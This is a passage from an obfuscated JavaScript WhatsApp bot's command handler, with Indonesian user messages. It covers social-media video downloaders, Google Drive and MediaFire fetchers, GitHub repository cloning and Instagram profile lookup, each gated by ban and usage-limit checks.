                let _0x117a58 = await fetch(_0x5804c8(0xc57) + encodeURIComponent(_0x1b04cf)),
                    _0x181104 = await _0x117a58[_0x5804c8(0x3f8)](),
                    _0x2780d8 = _0x181104[_0x5804c8(0x6b2)],
                    _0x5ac589 = _0x2780d8['map'](_0x16db43 => {
                        const _0x50abe3 = _0x5804c8;
                        return _0x50abe3(0xcce) + _0x16db43['nama'] + _0x50abe3(0x805) + _0x16db43[_0x50abe3(0x374)] + _0x50abe3(0x847) + _0x16db43[_0x50abe3(0x7f3)] + '\x0a*Link:* ' + _0x16db43['link'];
                    })[_0x5804c8(0xc6c)](_0x5804c8(0xd0e));
                googleImage(_0x1b04cf)[_0x5804c8(0xabe)](_0xf1b9d4 => {
                    const _0x465998 = _0x5804c8;
                    let _0x1349c8 = _0xf1b9d4,
                        _0x57e556 = _0x1349c8[Math[_0x465998(0xa2b)](Math['random']() * _0x1349c8[_0x465998(0x977)])];
                    _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                        'image': {
                            'url': _0x57e556
                        },
                        'caption': '' + _0x5ac589
                    }, {
                        'quoted': _0x1b1e88
                    });
                });
            } catch (_0x1ae711) {
                console[_0x5804c8(0x5d2)](_0x1ae711), _0x358f3b(_0x5804c8(0x751));
            }
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x85f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + ' Indonesia');
            let _0x1c3593 = require(_0x5804c8(0x80e));
            _0x1c3593({
                'query': _0x1b04cf
            })[_0x5804c8(0xabe)](_0x299d83 => {
                const _0x95090d = _0x5804c8;
                let _0x50464c = _0x95090d(0x2f1) + _0x1b04cf + '\x0a\x0a';
                for (let _0x5bd28e of _0x299d83) {
                    _0x50464c += '• *Title* : ' + _0x5bd28e['title'] + '\x0a', _0x50464c += _0x95090d(0xabc) + _0x5bd28e[_0x95090d(0x713)] + '\x0a', _0x50464c += _0x95090d(0x3a7) + _0x5bd28e['link'] + _0x95090d(0x7fb);
                }
                _0x358f3b(_0x50464c);
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x7ef):
        case 'komikus':
        case 'comics':
        case _0x5804c8(0x3c7): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x13c));
            let _0x3cd76c = await fetch(_0x5804c8(0x787) + _0x1b04cf),
                _0x5f2d1c = await _0x3cd76c[_0x5804c8(0x3f8)](),
                _0x154764 = _0x5f2d1c[_0x5804c8(0x233)][_0x5804c8(0x686)](_0x90e842 => _0x5804c8(0x5b9) + _0x90e842[_0x5804c8(0x196)] + '\x0a*Type:* ' + _0x90e842['type'] + '\x0a*Score:* ' + _0x90e842[_0x5804c8(0x46e)] + _0x5804c8(0xc51) + _0x90e842[_0x5804c8(0x598)] + _0x5804c8(0xb02) + _0x90e842[_0x5804c8(0xbf3)])[_0x5804c8(0xc6c)](_0x5804c8(0xd0e));
            _0x358f3b(_0x154764);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'fb':
        case _0x5804c8(0x857):
        case 'facebook': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x476));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x3c2440 = await fetchJson(_0x5804c8(0x951) + _0x1b04cf);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x3c2440[_0x5804c8(0x6b2)][_0x5804c8(0x6af)]
                },
                'caption': 'Done Sayang >///<'
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x9a89df => {
                const _0x3d069b = _0x5804c8;
                _0x358f3b(_0x3d069b(0xb9a));
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xa0f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x476));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0xa3ff21 = await fetchJson(_0x5804c8(0x2cb) + _0x1b04cf + '&apikey=' + _0x932571['ArifKey']);
                _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0xa3ff21[_0x5804c8(0x6b2)]['links']['hd']
                    },
                    'caption': _0x5804c8(0x6ec)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x202a7a) {
                _0x358f3b(_0x5804c8(0x58a));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x59d): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *url*');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0x4e668f = await fetchJson(_0x5804c8(0x2cb) + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x2d7)]);
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x4e668f[_0x5804c8(0x6b2)][_0x5804c8(0xaa2)]['sd']
                    },
                    'caption': _0x5804c8(0x6ec)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x3c154a) {
                _0x358f3b(_0x5804c8(0x58a));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xb84): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *url*');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x22ce49 = await fetchJson(_0x5804c8(0x2e7) + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x6bc)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x22ce49[_0x5804c8(0x6b2)]['HD']
                },
                'caption': 'Done Sayang >///<'
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x244883 => {
                _0x358f3b('Eror!!!');
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'twitter':
        case 'twittdl':
        case _0x5804c8(0x33f): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *url*');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0xf0162f = await fetchJson('https://worker.rmdni.id/downloader?url=' + _0x1b04cf);
                _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0xf0162f[_0x5804c8(0x6b2)][_0x5804c8(0xc3b)]
                    },
                    'caption': _0x5804c8(0x6ec)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0xdec171) {
                _0x358f3b('Sorry this video can\'t be download');
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xc56):
        case 'ig':
        case 'igdl':
        case 'igvideo':
        case _0x5804c8(0x293):
        case _0x5804c8(0xc7b):
        case _0x5804c8(0xa6d):
        case _0x5804c8(0x50b):
        case _0x5804c8(0xcac):
        case 'igtv':
        case _0x5804c8(0x240): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + ' https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0x14e38a = await fetchJson(_0x5804c8(0x33d) + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x14e38a[_0x5804c8(0x6b2)][_0x5804c8(0xbf3)]
                    },
                    'caption': _0x5804c8(0x9b3)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x5a6b19) {
                _0x358f3b('Sorry this video can\'t be download, Please try typing .ig2 *url*');
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x929): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x476));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0x3ea063 = await fetchJson(_0x5804c8(0xc35) + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571['XznKey']);
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x3ea063['media']
                    },
                    'caption': 'Done Sayang >///<'
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x2f5d8c) {
                _0x358f3b(_0x5804c8(0xc4f));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x987): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x284));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0x128be2 = await fetchJson(_0x5804c8(0x2cd) + _0x1b04cf);
                const _0x405f95 = _0x128be2['result']['url'];
                _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x405f95
                    },
                    'caption': 'Done Sayang >///<'
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0xf110a1) {
                _0x358f3b(_0x5804c8(0x397));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xb47):
        case 'instaphoto':
        case _0x5804c8(0xbb7):
        case _0x5804c8(0xc05): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + ' https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x9461c = await fetchJson(_0x5804c8(0xc35) + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x342)]);
            for (let _0x1c9d1f of _0x9461c[_0x5804c8(0x423)]) _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x1c9d1f
                },
                'caption': _0x5804c8(0x6ec)
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xbf8): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!q) return _0x358f3b(_0x5804c8(0xd9a) + (_0x3b7c58 + _0x453fc1) + ' username');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0x45ce9e = await fetchJson(_0x5804c8(0x1a2) + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x342)]);
                const _0x3fc5e1 = _0x45ce9e[_0x5804c8(0x2b0)],
                    _0x530bd7 = _0x45ce9e['id'],
                    _0x9a92a6 = _0x45ce9e[_0x5804c8(0xa78)],
                    _0x4427bc = _0x45ce9e[_0x5804c8(0x6a9)],
                    _0x316da8 = _0x45ce9e[_0x5804c8(0x98c)],
                    _0x1df4f7 = _0x45ce9e[_0x5804c8(0x2df)],
                    _0x314fc7 = _0x45ce9e[_0x5804c8(0xb0b)],
                    _0x3699f2 = _0x45ce9e[_0x5804c8(0xa2a)];
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'image': {
                        'url': _0x45ce9e[_0x5804c8(0xd4d)]
                    },
                    'caption': _0x5804c8(0x1d5) + _0x530bd7 + _0x5804c8(0x1db) + _0x3fc5e1 + '\x0aAkun Private : ' + _0x314fc7 + '\x0aAkun Terverifikasi : ' + _0x9a92a6 + _0x5804c8(0x922) + _0x4427bc + _0x5804c8(0xc76) + _0x316da8 + _0x5804c8(0x5a6) + _0x1df4f7 + _0x5804c8(0xa0e) + _0x3699f2
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x3bef47) {
                _0x358f3b('Error!\x0aPastikan username sama persis dan akun tidak di privat.');
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xae5):
        case _0x5804c8(0xa91):
        case 'ttsearch': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess[_0x5804c8(0x8f0)]);
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + ' *query*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x320));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0x49ff5d = await fetchJson(_0x5804c8(0xcd4) + _0x1b04cf + '&apikey=' + _0x932571[_0x5804c8(0x342)]);
                const _0x4b82d3 = _0x49ff5d[_0x5804c8(0x196)],
                    _0x2ea9fd = _0x49ff5d[_0x5804c8(0x6ed)]['nickname'];
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x49ff5d[_0x5804c8(0x72b)]
                    },
                    'caption': _0x5804c8(0x363) + _0x4b82d3 + _0x5804c8(0xb56) + _0x2ea9fd
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x455536) {
                _0x358f3b(_0x5804c8(0x7c6));
            }
        }
        break;
        case 'ttslide':
        case _0x5804c8(0xcf1): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x7e3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa3e));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x57b0da = _0x1b1e88[_0x5804c8(0x583)][0x0] || _0x1b1e88[_0x5804c8(0xd13)] || conn['parseMention'](_0x83eae5[0x0]) || _0x83eae5[0x0][_0x5804c8(0xa72)](/[@.+-]/g, '')[_0x5804c8(0xa72)](' ', '') + _0x5804c8(0x7cd) || '';
            try {
                let _0x1147b5 = await fetchJson(_0x5804c8(0x3db) + _0x1b04cf);
                for (let _0x4b078e of _0x1147b5[_0x5804c8(0x6b2)]['image']) {
                    await sleep(0x5dc), await _0x614da8[_0x5804c8(0x51b)](_0x57b0da, _0x4b078e, null, '', _0x1b1e88);
                }
                return await _0x614da8[_0x5804c8(0x938)](_0x57b0da, {
                    'text': 'Username : ' + _0x1147b5['result'][_0x5804c8(0xc81)] + _0x5804c8(0x66c) + _0x1147b5['result'][_0x5804c8(0x6b8)]
                }, {
                    'quoted': _0x1b1e88
                }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                    'text': _0x5804c8(0x6fb)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x51e2cb) {
                _0x358f3b(_0x5804c8(0x8b1));
            }
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x1a6):
        case 'tt':
        case _0x5804c8(0xb35):
        case _0x5804c8(0xb5e):
        case _0x5804c8(0x38b):
        case _0x5804c8(0xd2f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x549));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0x2aaee9 = await fetchJson(_0x5804c8(0x90d) + _0x932571[_0x5804c8(0xc67)] + _0x5804c8(0xa09) + _0x1b04cf);
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x2aaee9[_0x5804c8(0x6b2)][_0x5804c8(0x55d)]
                    },
                    'caption': 'Done Sayang >///<'
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x56bc11) {
                _0x358f3b(_0x5804c8(0x7c6));
            }
            limitAdd(_0x1b1e88['sender'], limit);
        }
        break;
        case 'tiktokmp3':
        case _0x5804c8(0x501):
        case 'tiktokaudio': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x549));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x1be328 = await fetchJson(_0x5804c8(0x90d) + _0x932571['BotKey'] + _0x5804c8(0xa09) + _0x1b04cf);
            const _0x4a3a9e = _0x1be328['result'][_0x5804c8(0x428)];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': {
                    'url': _0x4a3a9e
                },
                'mimetype': 'audio/mpeg'
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xab3):
        case _0x5804c8(0x210):
        case _0x5804c8(0x24a): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x476));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            const {
                sizeFormatter: _0x180e11
            } = await import('human-readable');
            let _0x2df17d = _0x180e11({
                'std': _0x5804c8(0x9a1),
                'decimalPlaces': 0x2,
                'keepTrailingZeroes': ![],
                'render': (_0x1c29e8, _0x5d5f4a) => _0x1c29e8 + ' ' + _0x5d5f4a + 'B'
            });
            async function _0x35f0fe(_0x49af49) {
                const _0x33f4ad = _0x5804c8;
                let _0x3603be;
                if (!(_0x49af49 && _0x49af49['match'](/drive\.google/i))) return _0x358f3b(_0x33f4ad(0x9d4));
                _0x3603be = (_0x49af49['match'](/\/?id=(.+)/i) || _0x49af49[_0x33f4ad(0x98b)](/\/d\/(.*?)\//))[0x1];
                if (!_0x3603be) return _0x358f3b('ID Not Found');
                let _0x3145b5 = await fetch('https://drive.google.com/uc?id=' + _0x3603be + _0x33f4ad(0x3d1), {
                        'method': 'post',
                        'headers': {
                            'accept-encoding': _0x33f4ad(0x438),
                            'content-length': 0x0,
                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                            'origin': 'https://drive.google.com',
                            'user-agent': _0x33f4ad(0xd3c),
                            'x-client-data': _0x33f4ad(0xa90),
                            'x-drive-first-party': _0x33f4ad(0x50d),
                            'x-json-requested': 'true'
                        }
                    }),
                    {
                        fileName: _0x5eafa3,
                        sizeBytes: _0x457464,
                        downloadUrl: _0x3dfb5a
                    } = JSON[_0x33f4ad(0x370)]((await _0x3145b5['text']())[_0x33f4ad(0x7af)](0x4));
                if (!_0x3dfb5a) return _0x358f3b(_0x33f4ad(0x599));
                let _0x3a740a = await fetch(_0x3dfb5a);
                if (_0x3a740a['status'] !== 0xc8) throw _0x3a740a[_0x33f4ad(0x6a5)];
                return {
                    'downloadUrl': _0x3dfb5a,
                    'fileName': _0x5eafa3,
                    'fileSize': _0x2df17d(_0x457464),
                    'mimetype': _0x3a740a[_0x33f4ad(0x279)][_0x33f4ad(0xb9b)](_0x33f4ad(0x587))
                };
            }
            _0x358f3b(mess[_0x5804c8(0x135)]), await sleep(0x1f4);
            if (!_0x1b04cf) return invalid(precom + ' https://drive.google.com/72jshshehk');
            _0x35f0fe(_0x83eae5[0x0])['then'](async _0x5e50e5 => {
                const _0x4be21d = _0x5804c8;
                if (!_0x5e50e5) throw _0x5e50e5;
                await _0x358f3b(JSON[_0x4be21d(0x736)](_0x5e50e5, null, 0x2)), _0x614da8[_0x4be21d(0x938)](_0x1b1e88[_0x4be21d(0x60f)], {
                    'document': {
                        'url': _0x5e50e5['downloadUrl']
                    },
                    'fileName': _0x5e50e5[_0x4be21d(0xaae)],
                    'mimetype': _0x5e50e5['mimetype'],
                    'contextInfo': {
                        'externalAdReply': {
                            'title': _0x358b6e,
                            'body': '' + _0x2eeea8,
                            'previewType': _0x4be21d(0x465),
                            'showAdAttribution': !![],
                            'sourceUrl': '',
                            'thumbnailUrl': _0xfc3dc4
                        }
                    }
                }, {
                    'quoted': _0x1b1e88
                });
            });
        }
        break;
        case _0x5804c8(0x305):
        case 'mfire':
        case _0x5804c8(0x3b3): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbbe));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x476));
            if (!isUrl(_0x1b04cf)) return _0x358f3b(mess[_0x5804c8(0x5d2)]['Iv']);
            if (!_0x1b04cf[_0x5804c8(0x34b)](_0x5804c8(0x1e3))) return _0x358f3b(mess['error']['Iv']);
            _0x358f3b(mess[_0x5804c8(0x135)]), _0x1c7aed(_0x5804c8(0x7cc), _0x1b1e88[_0x5804c8(0xd13)], _cmd), kotz[_0x5804c8(0x305)](_0x1b04cf)[_0x5804c8(0xabe)](async _0x1e7942 => {
                const _0x3d79c3 = _0x5804c8;
                _0x1e7942 = _0x1e7942[0x0], _0x1e7942[_0x3d79c3(0x452)] = decodeURIComponent(_0x1e7942[_0x3d79c3(0x452)]);
                var _0x4cd64a = await getBuffer(_0x1e7942[_0x3d79c3(0x734)]);
                if (_0x1e7942[_0x3d79c3(0xc75)][_0x3d79c3(0x34b)]('mp4')) _0x614da8[_0x3d79c3(0x938)](_0x1b1e88['chat'], {
                    'document': _0x4cd64a,
                    'fileName': _0x1e7942[_0x3d79c3(0x452)],
                    'mimetype': 'video/mp4'
                }, {
                    'quoted': _0x1b1e88
                });
                else _0x1e7942['mime']['includes'](_0x3d79c3(0x874)) ? _0x614da8[_0x3d79c3(0x938)](_0x1b1e88[_0x3d79c3(0x60f)], {
                    'document': _0x4cd64a,
                    'fileName': _0x1e7942[_0x3d79c3(0x452)],
                    'mimetype': _0x3d79c3(0x24b)
                }, {
                    'quoted': _0x1b1e88
                }) : _0x614da8['sendMessage'](_0x1b1e88[_0x3d79c3(0x60f)], {
                    'document': _0x4cd64a,
                    'fileName': _0x1e7942[_0x3d79c3(0x452)],
                    'mimetype': _0x3d79c3(0xc1e) + _0x1e7942[_0x3d79c3(0xc75)]
                }, {
                    'quoted': _0x1b1e88
                });
            })[_0x5804c8(0xb9d)](_0x5026e4 => {
                const _0x174c3f = _0x5804c8;
                console[_0x174c3f(0xcd3)](color(_0x174c3f(0xd58), 'red'), _0x5026e4), _0x358f3b(mess['error']['api']);
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'gitclone': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            let _0x4b88f5 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd82));
            if (!_0x4b88f5['test'](_0x1b04cf)) return _0x358f3b(_0x5804c8(0x555));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let [, _0x41f1be, _0x4bf8e9] = _0x1b04cf[_0x5804c8(0x98b)](_0x4b88f5) || [], _0x258844 = _0x4bf8e9[_0x5804c8(0xa72)](/.git$/, ''), _0x34540a = _0x5804c8(0xced) + _0x41f1be + '/' + _0x258844 + _0x5804c8(0x7d7), _0x553144 = (await fetch(_0x34540a, {
                'method': _0x5804c8(0x313)
            }))[_0x5804c8(0x279)][_0x5804c8(0xb9b)](_0x5804c8(0xa50))['match'](/attachment; filename=(.*)/)[0x1];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'document': {
                    'url': _0x34540a
                },
                'mimetype': _0x5804c8(0x4d6),
                'fileName': _0x553144
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x263):
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(mess[_0x5804c8(0xb42)]);
            if (_0x1132dc) return _0x358f3b('Afk sudah diaktifkan sebelumnya');
            _0x1c7aed(_0x5804c8(0xbad), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
